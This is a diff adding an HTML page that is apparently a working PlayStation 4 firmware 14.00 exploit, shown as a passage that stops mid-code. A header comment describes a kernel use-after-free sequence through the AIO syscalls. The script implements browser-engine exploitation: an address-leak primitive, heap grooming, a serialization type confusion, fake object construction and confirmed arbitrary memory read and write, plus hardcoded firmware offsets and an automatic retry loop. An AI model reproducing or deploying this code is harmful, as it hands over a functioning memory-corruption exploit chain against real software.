@@ -1,0 +1,2783 @@
+<!doctype html>
+<!--
+  PS4 14.00 - the scene's aio kernel-exploit sequence, ported exactly
+  (P1->P5 from the public jb.js / relapse chain, 13.02-13.52 family),
+  played through the proven SSV pipeline on firmware 14.00.
+
+  What it measures (write-up: docs/05-audits/aio-kex.md):
+    - submit 669 / cancel 666 / poll 664 / delete 662 all return 0 -
+      the handlers are alive;
+    - wait 663 returns an immediate error and never sleeps (tested at
+      1 ms and 100 ms): no waiter is ever created, the reclaim cannot
+      land. Verdict AIO-LIVE-NO-RECLAIM (deterministic, 7 runs / 2
+      boots, measured 2026-10-16).
+    - If a future firmware round ever re-enables the wait, this same
+      page becomes the working kernel exploit - AIO-WALK-PROVEN is the
+      success verdict (proofs are sink counters, no concurrency).
+
+  The sequence (single thread; every proof is read from OUR own
+  ArrayBuffers after the syscall returns):
+    P1  setsockopt(fd,41,51,0,0) x pool   frees the rthdr options
+        (0x48 chunks returned to the malloc zone);
+    P2  aio_submit_cmd(1|0x1000,...)      new group (669);
+    P3  aio_multi_wait(id,...,1ms)        the two jobs die in the sleep,
+        their completion frees the group's chunks (663);
+    P4  setsockopt(fd,41,51,node0,0x48) x spray   the fake waiter node0
+        reclaims the freed chunk;
+    P5  aio_multi_cancel(id,...) = THE WALK - per node: status write
+        (+0x20), mtx_lock owner=curthread (+0x10, kernel pointer leak),
+        dword decrement (+0x00), conditional counter-dec (+0x08).
+
+  Laws: carrier 5M slots, no less; one series per session; the scratch
+  page is mapped AND re-read before any cancel (the node0 decrement
+  targets 0x04000800); user-space sinks only; mmap hint without
+  MAP_FIXED returns the exact free address. No 622, no device open, no
+  connect, zero calls outside the allowed list.
+
+  Params: ?arms=1&spray=96&towait=1000&wholen=0&noclose=1
+-->
+<meta charset="utf-8"><title>ps4 14.00 - kex aio sequence</title>
+<body style="font:13px monospace"><pre id="out"></pre>
+<script>
+"use strict";
+var Q = new URLSearchParams(location.search);
+var requestedDrain = parseInt(Q.get("n") || "512", 10);
+var DRAIN_COUNT = isFinite(requestedDrain)
+    ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
+
+var REVISION = "genuine-u8-rw-3";
+var MAX_ATTEMPTS = 10;
+var attemptNumber = 0;
+var K = 2;
+var DUPLICATE_INDEX = 2;
+var CONTROL_INDEX = 0xffff;
+var CONTROL_INT = -64000;
+var FILLER_BIGINTS = K - 1;
+var FILLER_OBJECTS = 0xfffe - K;
+var EXPECTED_LENGTH = 0x50001;
+var CELL_BYTES = 0x30;
+
+var CARRIER_SLOTS = 5000000;
+try {
+    var slotsParam = parseInt(Q.get("slots") || "0", 10);
+    if (isFinite(slotsParam) && slotsParam >= 1000000 && slotsParam <= 9000000)
+        CARRIER_SLOTS = slotsParam;
+} catch (_) {}
+var CARRIER_BYTES = CARRIER_SLOTS * 8;
+var CAPTURE_DELAY_MS = 3000;
+var COMPOSE_DELAY_MS = 6500;
+var symbolToString = Symbol.prototype.toString;
+
+var DRAIN_SIZE = 0x10000;
+var SLAB_SIZE = 0x400000;
+var BUTTERFLY_HOLE_SIZE = 0x81000;
+var SEPARATOR_SIZE = 0x10000;
+var EARLY_HOLE_SIZE = 0x70000;
+var GUARD_SIZE = 0x90000;
+var PREDECESSOR_SIZE = 0x80000;
+var FINAL_HOLE_SIZE = 0x80000;
+
+var seq = 0;
+var referenceTarget = null;
+var rwBuffer = null;
+var rwView = null;
+var rwMirror = null;
+var targetBuffer = null;
+var targetView = null;
+var fakeHost = null;
+var lengthWord = null;
+var fillerGraph = null;
+var outerGraph = null;
+
+var leakedScope = null;
+var getterCarrier = null;
+var preparedSymbolObject = null;
+var capturedString = null;
+var capturedWords = null;
+var copiedLength = 0;
+var captureState = 0;
+var captureError = null;
+var hostAddress = NaN;
+var fakeAddress = NaN;
+
+var keepAlive = new Array(DRAIN_COUNT + 3);
+var keepIndex = 0;
+var predecessorWords = null;
+var pointerLow = 0;
+var pointerHigh = 0;
+var targetAddress = NaN;
+var targetAddressLow = 0;
+var targetAddressHigh = 0;
+
+var rwHeader = new Uint8Array(CELL_BYTES);
+var targetHeader = new Uint8Array(CELL_BYTES);
+var scratchBits = new ArrayBuffer(8);
+var scratchBytes = new Uint8Array(scratchBits);
+var scratchWords = new Uint32Array(scratchBits);
+var scratchDouble = new Float64Array(scratchBits);
+
+var rwOriginalVector = NaN;
+var targetVector = NaN;
+var rwHeaderOK = false;
+var targetHeaderOK = false;
+var readObserved = false;
+var writeObserved = false;
+var restoreObserved = false;
+var retrySafe = false;
+
+var compositionState = 0;
+var compositionLength = 0;
+var compositionError = null;
+
+function mark(tag, extra) {
+    seq++;
+    var line = seq + "-" + tag
+        + (extra !== undefined ? "-" + extra : "");
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "/log/" + encodeURIComponent(line), false);
+        xhr.send();
+    } catch (_) {}
+    try { document.getElementById("out").textContent += line + "\n"; } catch (_) {}
+}
+
+function hex(value) {
+    return "0x" + value.toString(16);
+}
+
+function buffer(size) {
+    return new ArrayBuffer(size);
+}
+
+function leakScopeObject() {
+    class Leaker { leak() { return super.foo; } }
+    Leaker.prototype.__proto__ = new Proxy({}, {
+        get: function (target, property, receiver) { return receiver; }
+    });
+    var leak = Leaker.prototype.leak;
+    return (function () { return leak(); })();
+}
+
+function prepareSymbolWrapper(F) {
+    leakedScope = leakScopeObject();
+    if (leakedScope === undefined || leakedScope === null)
+        throw new Error("scope-not-leaked");
+
+    for (var i = 0; i < 512; i++)
+        leakedScope["p" + i] = i;
+    for (var j = 0; j < 8; j++)
+        leakedScope[j] = 1.1 * j;
+
+    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+    return Object(leakedScope.g);
+}
+
+function pointerFromWords(words, offset) {
+    if (words[offset + 3] !== 0)
+        return NaN;
+    return words[offset]
+        + words[offset + 1] * 0x10000
+        + words[offset + 2] * 0x100000000;
+}
+
+function plausibleCell(value) {
+    return value > 0x100000000
+        && value <= 0xffffffffffff
+        && value <= 9007199254740991
+        && Math.floor(value) === value
+        && value % 8 === 0;
+}
+
+function encodedHeaderNumber() {
+    var raw = new ArrayBuffer(8);
+    var u32 = new Uint32Array(raw);
+    var f64 = new Float64Array(raw);
+    u32[0] = 0x00004250;
+    u32[1] = 0x01062800;
+    return f64[0];
+}
+
+function buildFakeHost() {
+    rwBuffer = new ArrayBuffer(0x100);
+    rwView = new Uint8Array(rwBuffer);
+    rwMirror = new Uint8Array(rwBuffer);
+    rwMirror[0] = 0x3c;
+
+    targetBuffer = new ArrayBuffer(0x20);
+    targetView = new Uint8Array(targetBuffer);
+    targetView[0] = 0xa5;
+    lengthWord = { keep: 0x51515151 };
+
+    fakeHost = {
+        q0: encodedHeaderNumber(),
+        q1: 1.1,
+        q2: rwView,
+        q3: lengthWord,
+        q4: 2.2,
+        q5: 3.3
+    };
+
+    delete fakeHost.q1;
+    delete fakeHost.q4;
+    delete fakeHost.q5;
+
+    if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
+        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
+        || targetView[0] !== 0xa5)
+        throw new Error("fake-host-shape-failed");
+}
+
+function buildAndStoreGraph() {
+    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+    buildFakeHost();
+
+    mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
+    fillerGraph = new Array(0xfffd);
+    var pos = 0;
+    var huge = 1n << 40n;
+    for (var b = 0; b < FILLER_BIGINTS; ++b)
+        fillerGraph[pos++] = huge + BigInt(b);
+    for (var o = 0; o < FILLER_OBJECTS; ++o)
+        fillerGraph[pos++] = {};
+
+    outerGraph = new Array(CONTROL_INDEX + 1);
+    outerGraph[0] = fillerGraph;
+    outerGraph[1] = referenceTarget;
+    outerGraph[2] = referenceTarget;
+    outerGraph[CONTROL_INDEX] = CONTROL_INT;
+    mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);
+
+    mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
+    history.replaceState(outerGraph, "");
+    mark("SSV-STORED", "fake-host-rw-target-not-serialized");
+}
+
+function prepareAddrof() {
+    capturedWords = new Uint16Array(16);
+    getterCarrier = function getterCarrierFunction() { return 7; };
+
+    mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
+    getterCarrier[0] = fakeHost;
+    for (var i = 1; i < CARRIER_SLOTS; i++)
+        getterCarrier[i] = 0;
+    getterCarrier[1] = targetView;
+    getterCarrier[2] = fakeHost;
+    getterCarrier[3] = targetView;
+    mark("ADDROF-CARRIER-DONE", "host-target-host-target");
+
+    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+    mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
+
+    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+    setTimeout(beginComposition, COMPOSE_DELAY_MS);
+}
+
+function runAddrofCapture() {
+    try {
+        capturedString = symbolToString.call(preparedSymbolObject);
+        copiedLength = capturedString.length;
+        for (var i = 0; i < 16; i++)
+            capturedWords[i] = capturedString.charCodeAt(7 + i);
+        captureState = 1;
+    } catch (error) {
+        captureError = error;
+        captureState = -1;
+    }
+}
+
+function fillRawCellPointers(backing, pointer) {
+    pointerHigh = Math.floor(pointer / 0x100000000);
+    pointerLow = pointer - pointerHigh * 0x100000000;
+
+    if (!plausibleCell(pointer)
+        || pointerHigh < 0 || pointerHigh > 0xffff
+        || Math.floor(pointerLow) !== pointerLow
+        || pointerLow < 0 || pointerLow > 0xffffffff
+        || pointerLow + pointerHigh * 0x100000000 !== pointer)
+        throw new Error("invalid-low48-fake-address");
+
+    predecessorWords = new Uint32Array(backing);
+    for (var i = 0; i < predecessorWords.length; i += 2) {
+        predecessorWords[i] = pointerLow;
+        predecessorWords[i + 1] = pointerHigh;
+    }
+
+    var last = predecessorWords.length - 2;
+    if (predecessorWords[0] !== pointerLow
+        || predecessorWords[1] !== pointerHigh
+        || predecessorWords[last] !== pointerLow
+        || predecessorWords[last + 1] !== pointerHigh)
+        throw new Error("pointer-fill-verification-failed");
+}
+
+function clearPredecessor() {
+    if (predecessorWords !== null)
+        predecessorWords.fill(0);
+}
+
+function loadHistoryCritical() {
+    var result = null;
+    var candidate = null;
+    var rwHeaderCaptured = false;
+    var rwVectorTouched = false;
+    try {
+        result = history.state;
+        compositionLength = result.length;
+
+        if (compositionLength !== EXPECTED_LENGTH) {
+            result[DUPLICATE_INDEX] = undefined;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 3;
+            return;
+        }
+
+        if (result[1] === result[DUPLICATE_INDEX]) {
+            result[DUPLICATE_INDEX] = undefined;
+            candidate = null;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 2;
+            return;
+        }
+
+        candidate = result[DUPLICATE_INDEX];
+        result[DUPLICATE_INDEX] = undefined;
+        result = null;
+
+        for (var i = 0; i < CELL_BYTES; ++i)
+            rwHeader[i] = candidate[i];
+        rwHeaderCaptured = true;
+
+        var rwSID = rwHeader[0]
+            + rwHeader[1] * 0x100
+            + rwHeader[2] * 0x10000
+            + rwHeader[3] * 0x1000000;
+        var rwHeaderHigh = rwHeader[4]
+            + rwHeader[5] * 0x100
+            + rwHeader[6] * 0x10000
+            + rwHeader[7] * 0x1000000;
+        var rwButterfly = rwHeader[8]
+            + rwHeader[9] * 0x100
+            + rwHeader[10] * 0x10000
+            + rwHeader[11] * 0x1000000
+            + rwHeader[12] * 0x100000000
+            + rwHeader[13] * 0x10000000000;
+        var rwVectorLow = rwHeader[0x10]
+            + rwHeader[0x11] * 0x100
+            + rwHeader[0x12] * 0x10000
+            + rwHeader[0x13] * 0x1000000;
+        var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
+        rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;
+
+        var rwOffsetZero = true;
+        for (var rz = 0x20; rz < 0x28; ++rz) {
+            if (rwHeader[rz] !== 0)
+                rwOffsetZero = false;
+        }
+        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
+            && (rwSID & 0xf) === 0
+            && rwHeader[4] === 0 && rwHeader[5] === 0x28
+            && rwHeader[6] === 0x08
+            && (rwHeader[7] === 0 || rwHeader[7] === 1)
+            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
+            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
+            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
+            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
+            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
+            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
+            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
+            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
+            && rwOffsetZero && rwHeader[0x28] === 0x58;
+
+        if (!rwHeaderOK) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = rwSID;
+        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        var upgradedHeader = scratchDouble[0];
+        var upgradedFinite = upgradedHeader === upgradedHeader
+            && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
+        if (!upgradedFinite) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+        fakeHost.q0 = upgradedHeader;
+        if (fakeHost.q0 !== upgradedHeader) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = targetAddressLow;
+        scratchWords[1] = targetAddressHigh;
+        rwVectorTouched = true;
+        for (var w1 = 0; w1 < 8; ++w1)
+            candidate[0x10 + w1] = scratchBytes[w1];
+
+        for (var j = 0; j < CELL_BYTES; ++j)
+            targetHeader[j] = rwView[j];
+
+        var targetSID = targetHeader[0]
+            + targetHeader[1] * 0x100
+            + targetHeader[2] * 0x10000
+            + targetHeader[3] * 0x1000000;
+        var targetButterfly = targetHeader[8]
+            + targetHeader[9] * 0x100
+            + targetHeader[10] * 0x10000
+            + targetHeader[11] * 0x1000000
+            + targetHeader[12] * 0x100000000
+            + targetHeader[13] * 0x10000000000;
+        var targetVectorLow = targetHeader[0x10]
+            + targetHeader[0x11] * 0x100
+            + targetHeader[0x12] * 0x10000
+            + targetHeader[0x13] * 0x1000000;
+        var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
+        targetVector = targetVectorLow + targetVectorHigh * 0x100000000;
+
+        var targetOffsetZero = true;
+        for (var tz = 0x20; tz < 0x28; ++tz) {
+            if (targetHeader[tz] !== 0)
+                targetOffsetZero = false;
+        }
+        targetHeaderOK = targetSID === rwSID
+            && targetHeader[4] === 0 && targetHeader[5] === 0x28
+            && targetHeader[6] === 0x08
+            && (targetHeader[7] === 0 || targetHeader[7] === 1)
+            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
+            && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
+            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
+            && targetVector > 0x100000000 && targetVector % 8 === 0
+            && targetHeader[0x18] === 0x20
+            && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0
+            && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0
+            && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
+            && targetHeader[0x1f] === 0 && targetOffsetZero
+            && targetHeader[0x28] === 0x58;
+
+        if (!targetHeaderOK) {
+            for (var r1 = 0; r1 < 8; ++r1)
+                candidate[0x10 + r1] = rwHeader[0x10 + r1];
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = targetVectorLow;
+        scratchWords[1] = targetVectorHigh;
+        for (var w2 = 0; w2 < 8; ++w2)
+            candidate[0x10 + w2] = scratchBytes[w2];
+
+        readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
+        if (!readObserved) {
+            for (var rRead = 0; rRead < 8; ++rRead)
+                candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
+            rwVectorTouched = false;
+            targetView[0] = 0xa5;
+            rwMirror[0] = 0x3c;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+        rwView[0] = 0x5a;
+        writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
+        rwView[0] = 0xa5;
+
+        for (var r2 = 0; r2 < 8; ++r2)
+            candidate[0x10 + r2] = rwHeader[0x10 + r2];
+        rwVectorTouched = false;
+        targetView[0] = 0xa5;
+        rwMirror[0] = 0x3c;
+        restoreObserved = rwView[0] === 0x3c
+            && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+
+        leakHook(candidate);
+
+        candidate = null;
+        clearPredecessor();
+        compositionState = 1;
+    } catch (error) {
+        retrySafe = candidate === null && result === null
+            && !rwHeaderCaptured && error && error.name === "TypeError";
+        if (result !== null) {
+            try { result[DUPLICATE_INDEX] = undefined; } catch (_) {}
+        }
+        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+            try {
+                for (var rr = 0; rr < 8; ++rr)
+                    candidate[0x10 + rr] = rwHeader[0x10 + rr];
+            } catch (_) {}
+        }
+        candidate = null;
+        result = null;
+        try { targetView[0] = 0xa5; } catch (_) {}
+        try { rwMirror[0] = 0x3c; } catch (_) {}
+        try { clearPredecessor(); } catch (_) {}
+        compositionError = error;
+        compositionState = -1;
+    }
+}
+
+function allZero(bytes, start, end) {
+    for (var i = start; i < end; ++i) {
+        if (bytes[i] !== 0)
+            return false;
+    }
+    return true;
+}
+
+function uint32At(bytes, offset) {
+    return bytes[offset]
+        + bytes[offset + 1] * 0x100
+        + bytes[offset + 2] * 0x10000
+        + bytes[offset + 3] * 0x1000000;
+}
+
+function low48At(bytes, offset) {
+    return bytes[offset]
+        + bytes[offset + 1] * 0x100
+        + bytes[offset + 2] * 0x10000
+        + bytes[offset + 3] * 0x1000000
+        + bytes[offset + 4] * 0x100000000
+        + bytes[offset + 5] * 0x10000000000;
+}
+
+function dumpHex(bytes) {
+    var out = "";
+    for (var i = 0; i < CELL_BYTES; ++i)
+        out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
+    return out;
+}
+
+function reportComposition() {
+    if (compositionState < 0) {
+        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
+            (compositionError && compositionError.name) + ":"
+            + String(compositionError && compositionError.message).slice(0, 80));
+        mark("DONE-THROW", "predecessor-cleared=true");
+        if (!retrySafe) {
+            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
+        }
+        setTimeout(function () { mark("SURVIVED-THROW-T1000"); }, 1000);
+        return;
+    }
+
+    if (compositionState === 2) {
+        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
+        mark("DONE-MISS", "predecessor-cleared=true");
+        setTimeout(function () { mark("SURVIVED-MISS-T1000"); }, 1000);
+        return;
+    }
+
+    if (compositionState === 3) {
+        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK
+            + "-carrier-restored=true");
+        mark("RW-HEADER-HEX", dumpHex(rwHeader));
+        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+        if (!retrySafe) {
+            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
+        }
+        setTimeout(function () { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
+        return;
+    }
+
+    if (compositionState === 0) {
+        mark("NO-RESULT", "critical-load-did-not-finish");
+        return;
+    }
+
+    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength
+        + "-predecessor-cleared=true");
+    mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0))
+        + "-vector=" + hex(rwOriginalVector)
+        + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
+    mark("TARGET-CELL", "P=" + hex(targetAddress)
+        + "-sid=" + hex(uint32At(targetHeader, 0))
+        + "-vector=" + hex(targetVector)
+        + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
+    mark("RW-HEADER-HEX", dumpHex(rwHeader));
+    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+
+    var readPass = rwHeaderOK && targetHeaderOK && readObserved
+        && compositionLength === EXPECTED_LENGTH;
+    var writePass = writeObserved && restoreObserved;
+    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
+    if (readPass)
+        mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
+    else
+        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
+            + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
+            + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
+
+    if (writePass)
+        mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
+    else
+        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
+            + "-restore=" + restoreObserved);
+
+    if (readPass && writePass) {
+        mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
+        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
+    }
+
+    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
+        + "-target-byte=" + targetView[0].toString(16)
+        + "-length-word=" + lengthWord.keep.toString(16));
+    setTimeout(function () { mark("SURVIVED-T100"); }, 100);
+    setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
+    setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
+}
+
+function runGroomAndLoad() {
+    try {
+        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
+        var channel = new MessageChannel();
+        channel.port1.close();
+        channel.port2.close();
+
+        for (var i = 0; i < DRAIN_COUNT; ++i)
+            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+
+        var slab = buffer(SLAB_SIZE);
+        channel.port1.postMessage(0, [slab]);
+        slab = null;
+
+        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
+        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
+        var separator = buffer(SEPARATOR_SIZE);
+        var earlyHole = buffer(EARLY_HOLE_SIZE);
+        var guard = buffer(GUARD_SIZE);
+        var predecessor = buffer(PREDECESSOR_SIZE);
+        var finalHole = buffer(FINAL_HOLE_SIZE);
+
+        fillRawCellPointers(predecessor, fakeAddress);
+        keepAlive[keepIndex++] = separator;
+        keepAlive[keepIndex++] = guard;
+        keepAlive[keepIndex++] = predecessor;
+        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
+            + "-fake=" + hex(fakeAddress));
+
+        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
+            earlyHole, finalHole]);
+        loadHistoryCritical();
+    } catch (error) {
+        try { clearPredecessor(); } catch (_) {}
+        compositionError = error;
+        compositionState = -1;
+    }
+    reportComposition();
+}
+
+function beginComposition() {
+    if (captureState === 0) {
+        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
+        return;
+    }
+    if (captureState < 0) {
+        mark("ADDROF-THREW", (captureError && captureError.name) + ":"
+            + String(captureError && captureError.message).slice(0, 80));
+        return;
+    }
+
+    var a0 = pointerFromWords(capturedWords, 0);
+    var b0 = pointerFromWords(capturedWords, 4);
+    var a1 = pointerFromWords(capturedWords, 8);
+    var b1 = pointerFromWords(capturedWords, 12);
+    var repeated = a0 === a1 && b0 === b1;
+    var distinct = a0 !== b0;
+    var plausible = plausibleCell(a0) && plausibleCell(b0)
+        && plausibleCell(a1) && plausibleCell(b1);
+    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+
+    mark("ADDROF-RETURNED", REVISION);
+    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
+    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
+        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
+
+    if (!(repeated && distinct && plausible && sourceCovered)) {
+        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
+            + "-plausible=" + plausible + "-covered=" + sourceCovered);
+        return;
+    }
+
+    hostAddress = a0;
+    targetAddress = b0;
+    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
+        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
+        || Math.floor(targetAddressLow) !== targetAddressLow
+        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
+        return;
+    }
+    fakeAddress = hostAddress + 0x10;
+    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
+        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
+        return;
+    }
+    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
+        + "-delta=0x10");
+    runGroomAndLoad();
+}
+
+var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
+allowAgain = true;
+var attemptKey = REVISION + ":attempts";
+var passKey = REVISION + ":passed";
+var blockKey = REVISION + ":blocked";
+var priorAttempts = 0;
+var alreadyPassed = false;
+var alreadyBlocked = false;
+try {
+    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
+    if (!isFinite(priorAttempts) || priorAttempts < 0)
+        priorAttempts = 0;
+    alreadyPassed = sessionStorage.getItem(passKey) === "1";
+    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
+} catch (_) {}
+attemptNumber = priorAttempts + 1;
+
+mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
+    + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);
+
+if (alreadyPassed && !allowAgain) {
+    mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
+} else if (alreadyBlocked && !allowAgain) {
+    mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
+} else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
+    mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
+} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
+    || typeof Symbol !== "function" || typeof history === "undefined"
+    || typeof history.replaceState !== "function") {
+    mark("UNSUPPORTED");
+} else {
+    try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
+    try {
+        buildAndStoreGraph();
+        prepareAddrof();
+    } catch (error) {
+        mark("SETUP-THREW", (error && error.name) + ":"
+            + String(error && error.message).slice(0, 80));
+    }
+}
+
+var R3_REVISION = "leak-pair-1";
+
+var R3_WK_EXPM1_BUILTIN = 0x2586880;
+var R3_WK_IMP_ERROR = 0x3cb8cc8;
+var R3_WK_JSFUNCTION_M_FUNCTION = 0x28;
+
+var R3_PAIR_DELTA = 0x24B0C20;
+
+var R3_PARSEINT_RVA = R3_WK_EXPM1_BUILTIN - R3_PAIR_DELTA;
+
+var R3_S28_MIN = 0x100000000;
+var R3_S28_MAX = 0x10000000000;
+var R3_REGION_SHIFT = 32;
+
+var R3_TRAMP_RES = 0x5e8;
+
+var R3_DUMP_CHUNK = 0x100;
+var R3_WIN = 0x40;
+
+var R3_OUT_MAX = 1024;
+// MEASURED MEMORY CEILING (2026-10-16): carrier 40 MB + n*64 KB drain
+// buffers + ~5 MB of slabs. Full success at n<=512 (~77 MB total),
+// death at n=640 (~85 MB) and n=1024 (~109 MB). The auto ladder stays
+// inside the proven band - every rung is a fresh draw, never a climb
+// toward the ceiling.
+var R3_AUTO_LADDER = [512, 384, 256, 512, 384, 256];
+function r3SlotsKeep() {
+    // The auto-reload must carry ALL query parameters - previously only
+    // slots survived, so a stage-1 miss on a diagnostic click reloaded
+    // with DEFAULTS and the sequence ran without anyone asking for it.
+    var keep = "";
+    var names = ["slots", "arms", "spray", "towait", "wholen", "noclose",
+                 "core"];
+    for (var i = 0; i < names.length; ++i) {
+        var v = Q.get(names[i]);
+        if (v !== null && v !== "")
+            keep += "&" + names[i] + "="
+                + encodeURIComponent(v);
+    }
+    return keep;
+}
+var R3_AUTO_DELAY_MS = 2500;
+
+(function () {
+    var qAuto = new URLSearchParams(location.search);
+    var tryIdx = parseInt(qAuto.get("try") || "0", 10) || 0;
+    var scheduled = false;
+    var passSeen = false;
+    try {
+        var expectTok = sessionStorage.getItem("r3expect");
+        if (expectTok !== null && expectTok === String(tryIdx)) {
+            sessionStorage.removeItem("r3expect");
+        } else if (tryIdx > 0) {
+            var crashNext = tryIdx + 1;
+            if (crashNext < R3_AUTO_LADDER.length) {
+                mark("AUTO-CRASH-ADVANCE", "deadTry=" + tryIdx
+                    + "-next=" + crashNext
+                    + "-n=" + R3_AUTO_LADDER[crashNext]);
+                sessionStorage.setItem("r3expect", String(crashNext));
+                location.replace("kex-aio.html?n=" + R3_AUTO_LADDER[crashNext]
+                    + "&try=" + crashNext + r3SlotsKeep());
+            } else {
+                mark("AUTO-EXHAUSTED",
+                    "crash-restore-after-last-try-action=recharge-manuelle");
+            }
+        }
+    } catch (_) {}
+    var TERMINAL_MISS = {
+        "DONE-MISS": 1, "DONE-THROW": 1, "HEADER-MISMATCH": 1,
+        "ARBITRARY-READ-MISMATCH": 1, "ARBITRARY-WRITE-MISMATCH": 1,
+        "ADDROF-THREW": 1, "ADDROF-FAIL": 1, "TARGET-ADDRESS-FAIL": 1,
